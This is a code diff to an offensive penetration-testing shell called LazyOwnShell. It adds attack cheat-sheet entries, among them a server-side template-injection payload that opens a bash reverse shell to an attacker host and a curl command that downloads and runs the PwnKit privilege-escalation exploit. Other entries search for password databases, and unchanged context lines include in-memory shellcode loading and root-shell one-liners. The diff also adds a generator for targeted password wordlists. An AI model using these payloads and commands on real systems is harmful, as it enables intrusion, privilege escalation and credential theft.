@@ -79,6 +79,7 @@ class LazyOwnShell(Cmd):
         "auto": "pyautomate",
         "aslr": "run lazyaslrcheck",
         "discovery": "run lazynmapdiscovery",
+        "duckdns": "sh bash modules/duckdns.sh",
         "ftpsniff": "run lazyftpsniff",
         "gpt": "run lazygptcli",
         "ls": "list",
@@ -1794,7 +1795,7 @@ class LazyOwnShell(Cmd):
                 if not is_binary_present("zipalign"):
                     print_warn("zipalign is not presetn in the system, installing...")
                     os.system("sudo apt-get install zipalign")
-                os.system("zipalign -v 4 sessios/shell.apk signed_shell.apk")
+                os.system("zipalign -v 4 sessions/shell.apk sessions/signed_shell.apk")
 
             # Move and set permissions for the generated payload
             if choice in commands:
@@ -4816,10 +4817,13 @@ class LazyOwnShell(Cmd):
             ("find .bash_history files in current dir", "find . -type f -name .bash_history"),
             ("find all .fetchmailrc files", "find / -type f -name .fetchmailrc"),
             ("find .fetchmailrc files in current dir", "find . -type f -name .fetchmailrc"),
+            ("find .kdb files", "find / -type f -name *.kdb 2>/dev/null"),
             ("Timers", "systemctl list-timers"),
             ("python", "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"),
             ("python shellcode.bin", f'python3 -c "import base64, ctypes, urllib.request; url = \'http://{lhost}/shellcode.bin\'; response = urllib.request.urlopen(url); shellcode = base64.b64decode(response.read()); shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode)); shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p)); shellcode_func()"'),
             ("pwnkit", f"curl -o PwnKit http://{lhost}/PwnKit ; chmod +x ./PwnKit ; ./PwnKit"),
+            ("pwnkit", f"curl -o PwnKit http://{lhost}/PwnKit32 ; chmod +x ./PwnKit ; ./PwnKit"),
+            ("SqlPAD Inyection","""{{ process.mainModule.require('child_process').exec('/bin/bash -c \\'bash -i >& /dev/tcp/{lhost}/5555 0>&1\\'') }}""".replace("{lhost}", lhost)),
             ("locate httpd.conf files", "locate httpd.conf"),
             ("locate vhosts.conf files", "locate vhosts.conf"),
             ("locate proftpd.conf files", "locate proftpd.conf"),
@@ -10087,7 +10091,7 @@ class LazyOwnShell(Cmd):
 
     def do_ivy(self, line):
         """
-        Generates payloads using Ivy with various options.
+        Generates payloads using Ivy with various options. Ivy is a payload creation framework for the execution of arbitrary VBA (macro) source code directly in memory. Ivy’s loader does this by utilizing programmatical access in the VBA object environment to load, decrypt and execute shellcode.
 
         This function checks if `Ivy` is installed and installs it if necessary. It then runs `Ivy`
         with the specified parameters to create various payloads.
@@ -10218,6 +10222,314 @@ class LazyOwnShell(Cmd):
         print_msg(command)
         os.system(command)
 
+        return
+
+    def do_generatedic(self, line):
+        """
+        Generates a wordlist based on a target name and a list of characters, with various combinations.
+
+        This function prompts the user for a target name and a wordlist name, then generates various combinations 
+        of the target name with a given list of characters. The combinations include single, double, triple, fourth, 
+        fifth, sixth, and intercalated character variations. The generated passwords are saved to the specified 
+        wordlist file.
+
+        :param line: Not used in this function.
+
+        :returns: None
+
+        Manual execution:
+        To manually generate a wordlist, run the script and follow the prompts to enter the target name, 
+        wordlist name, and additional characters if desired.
+
+        For example:
+            Enter target name(Ex. john) ::: john
+            Enter wordlist name ::: my_wordlist.txt
+            Char List ::: 1 2 3 4 5 6 7 8 9 0 ! @ # $
+            Do you want to add more characters in char List[y/n] ::: y
+            Enter characters by commas(Ex. : ^,&,*,) ::: ^,&,*
+        """
+        
+        def single_combo(name, characters, file, total, flag):
+            """
+            Generates single character combinations with the target name.
+
+            :param name: Target name to use in the combinations.
+            :param characters: List of characters to combine with the target name.
+            :param file: File object to write the combinations to.
+            :param total: Running total of passwords generated.
+            :param flag: If True, generate combinations with the target name at both the beginning and the end of the string.
+
+            :returns: Updated total of passwords generated.
+            """
+            for char in characters:
+                cpass1 = name + char
+                if flag:
+                    cpass2 = char + name
+                    file.write(cpass1 + "\n" + cpass2 + "\n")
+                    total += 2
+                else:
+                    file.write(cpass1 + "\n")
+                    total += 1
+            return total
+
+        def double_combo(name, characters, file, total, flag):
+            """
+            Generates double character combinations with the target name.
+
+            :param name: Target name to use in the combinations.
+            :param characters: List of characters to combine with the target name.
+            :param file: File object to write the combinations to.
+            :param total: Running total of passwords generated.
+            :param flag: If True, generate combinations with the target name at both the beginning and the end of the string.
+
+            :returns: Updated total of passwords generated.
+            """
+            for char1 in characters:
+                for char2 in characters:
+                    cpass1 = name + char1 + char2
+                    if flag:
+                        cpass2 = char1 + char2 + name
+                        file.write(cpass1 + "\n" + cpass2 + "\n")
+                        total += 2
+                    else:
+                        file.write(cpass1 + "\n")
+                        total += 1
+            return total
+
+        def triple_combo(name, characters, file, total, flag):
+            """
+            Generates triple character combinations with the target name.
+
+            :param name: Target name to use in the combinations.
+            :param characters: List of characters to combine with the target name.
+            :param file: File object to write the combinations to.
+            :param total: Running total of passwords generated.
+            :param flag: If True, generate combinations with the target name at both the beginning and the end of the string.
+
+            :returns: Updated total of passwords generated.
+            """
+            for char1 in characters:
+                for char2 in characters:
+                    for char3 in characters:
+                        cpass1 = name + char1 + char2 + char3
+                        if flag:
+                            cpass2 = char1 + char2 + char3 + name
+                            file.write(cpass1 + "\n" + cpass2 + "\n")
+                            total += 2
+                        else:
+                            file.write(cpass1 + "\n")
+                            total += 1
+            return total
+
+        def fourth_combo(name, characters, file, total, flag):
+            """
+            Generates fourth character combinations with the target name.
+
+            :param name: Target name to use in the combinations.
+            :param characters: List of characters to combine with the target name.
+            :param file: File object to write the combinations to.
+            :param total: Running total of passwords generated.
+            :param flag: If True, generate combinations with the target name at both the beginning and the end of the string.
+
+            :returns: Updated total of passwords generated.
+            """
+            for char1 in characters:
+                for char2 in characters:
+                    for char3 in characters:
+                        for char4 in characters:
+                            cpass1 = name + char1 + char2 + char3 + char4
+                            if flag:
+                                cpass2 = char1 + char2 + char3 + char4 + name
+                                file.write(cpass1 + "\n" + cpass2 + "\n")
+                                total += 2
+                            else:
+                                file.write(cpass1 + "\n")
+                                total += 1
+            return total
+
+        def fifth_combo(name, characters, file, total, flag):
+            """
+            Generates fifth character combinations with the target name.
+
+            :param name: Target name to use in the combinations.
+            :param characters: List of characters to combine with the target name.
+            :param file: File object to write the combinations to.
+            :param total: Running total of passwords generated.
+            :param flag: If True, generate combinations with the target name at both the beginning and the end of the string.
+
+            :returns: Updated total of passwords generated.
+            """
+            for char1 in characters:
+                for char2 in characters:
+                    for char3 in characters:
+                        for char4 in characters:
+                            for char5 in characters:
+                                cpass1 = name + char1 + char2 + char3 + char4 + char5
+                                if flag:
+                                    cpass2 = char1 + char2 + char3 + char4 + char5 + name
+                                    file.write(cpass1 + "\n" + cpass2 + "\n")
+                                    total += 2
+                                else:
+                                    file.write(cpass1 + "\n")
+                                    total += 1
+            return total
+        
+        def sixth_combo(name, characters, file, total, flag):
+            """
+            Generates sixth character combinations with the target name, adding uppercase characters.
+
+            :param name: Target name to use in the combinations.
+            :param characters: List of characters to combine with the target name.
+            :param file: File object to write the combinations to.
+            :param total: Running total of passwords generated.
+            :param flag: If True, generate combinations with the target name at both the beginning and the end of the string.
+
+            :returns: Updated total of passwords generated.
+            """
+            from itertools import product
+            for combo in product(characters, repeat=6):  
+                combo_str = ''.join(combo)
+                cpass1 = name + combo_str.upper()
+                if flag:
+                    cpass2 = combo_str.upper() + name
+                    file.write(cpass1 + "\n" + cpass2 + "\n")
+                    total += 2
+                else:
+                    file.write(cpass1 + "\n")
+                    total += 1
+            return total
+
+        def intercalate_combo(name, characters, file, total, flag):
+            """
+            Generates combinations of the target name and character list, intercalating uppercase and lowercase characters.
+            
+            This function generates combinations where each character in the string alternates between uppercase and 
+            lowercase. It also allows for the addition of the target name at the beginning or the end of the string.
+
+            :param name: Target name to use in the combinations.
+            :param characters: List of characters to intercalate with the target name.
+            :param file: File object to write the combinations to.
+            :param total: Running total of passwords generated.
+            :param flag: If True, generate combinations with the target name at both the beginning and the end of the string.
+
+            :returns: Updated total of passwords generated.
+            """
+                        
+            def alternate_case(s):
+                """Helper function to alternate the case of characters in a string."""
+                return ''.join(c.lower() if i % 2 == 0 else c.upper() for i, c in enumerate(s))
+            
+            for combo in product(characters, repeat=6): 
+                combo_str = ''.join(combo)
+                cpass1 = name + alternate_case(combo_str)
+                if flag:
+                    cpass2 = alternate_case(combo_str) + name
+                    file.write(cpass1 + "\n" + cpass2 + "\n")
+                    total += 2
+                else:
+                    file.write(cpass1 + "\n")
+                    total += 1
+            return total
+
+        def expand_regex(regex):
+            """
+            Expands a regular expression into a list of characters.
+            
+            :param regex: Regular expression string to expand.
+            :returns: List of characters matching the regular expression.
+            """
+
+            char_list = []
+            if regex:
+                if '[a-z]' in regex:
+                    char_list.extend(list(string.ascii_lowercase))
+                if '[A-Z]' in regex:
+                    char_list.extend(list(string.ascii_uppercase))
+                if '[0-9]' in regex:
+                    char_list.extend(list(string.digits))
+                if '[!@#$%^&*()]' in regex:
+                    char_list.extend(list('!@#$%^&*()'))
+            return char_list
+
+        if not line:
+            print_msg("Target name: ")
+            target_name = input("    ╰─ ").strip()
+        else:
+            target_name = line
+
+        wordlist_name = f"sessions/dic_{target_name}.txt"
+
+        print_msg("Char List: ")
+        char_list = input("    ╰─ ").strip().split()
+
+
+
+        print_msg("Enter characters by commas(Ex. : ^,&,*,): ")
+        more_chars = input("    ╰─ ").strip().split(',')
+        char_list.extend(more_chars)
+        
+        print_msg("Do you want to add more characters in char List[y/n]: ")
+        add_more = input("    ╰─ ").strip().lower()
+
+        if add_more == 'y':
+            print_msg("Enter a regex pattern to generate combinations (optional Ex. [a-z], [A-Z], [0-9] or [!@#$%^&*()]): ")
+            regex_input = input("    ╰─ ").strip().split(',')
+            if regex_input:
+                char_list.extend(expand_regex(regex_input))
+        total_passwords = 0
+        print_warn("Generating dictionary... this might take a while, so why not grab a coffee and come back to a freshly brewed wordlist? ☕")
+        with open(wordlist_name, 'w') as f:
+            total_passwords = single_combo(target_name, char_list, f, total_passwords, True)
+            total_passwords = double_combo(target_name, char_list, f, total_passwords, True)
+            total_passwords = triple_combo(target_name, char_list, f, total_passwords, True)
+            total_passwords = fourth_combo(target_name, char_list, f, total_passwords, True)
+            total_passwords = fifth_combo(target_name, char_list, f, total_passwords, True)
+            total_passwords = sixth_combo(target_name, char_list, f, total_passwords, True)
+            total_passwords = intercalate_combo(target_name, char_list, f, total_passwords, True)
+
+        print_msg(f"Wordlist {wordlist_name} generated with {total_passwords} passwords.")
+        return
+
+    def do_trace(self, line):
+        """
+        Traces the DNS information for a given domain using the FreeDNS service. (using freedns IP Not your IP)
+
+        This method performs a DNS trace lookup for the specified domain by
+        sending an HTTP GET request to the FreeDNS service. If no domain is provided
+        in the input parameter `line`, it defaults to using the URL specified in the
+        instance's parameters.
+
+        Parameters:
+        line (str): The domain name to trace. If not provided, the method uses the
+                    domain extracted from `self.params["url"]`.
+
+        Returns:
+        None: This method executes a system command and does not return a value.
+
+        Example:
+        >>> self.do_trace("example.com")
+        Executes a DNS trace for "example.com".
+
+        Notes:
+        - Ensure that the `self.params["url"]` is set with a valid URL if no domain
+        is provided.
+        - The method uses `os.system` to execute the trace command, which may not
+        be the most secure or efficient method for production code. Consider using
+        a library like `requests` for HTTP operations if security and efficiency
+        are concerns.
+        """
+        if not line:
+            url = self.params["url"]
+            domain = get_domain(url)
+        else:
+            domain = line
+        if not is_binary_present("batcat"):
+            print_warn("Installing batcat")
+            os.system("sudo apt install bat -y")
+
+        command = f"curl -s -X GET https://freedns.afraid.org/domain/dnstrace.php\?domain\={domain}\&submit\=Trace | batcat"
+        print_msg(command)
+        os.system(command)
         return
 
 if __name__ == "__main__":
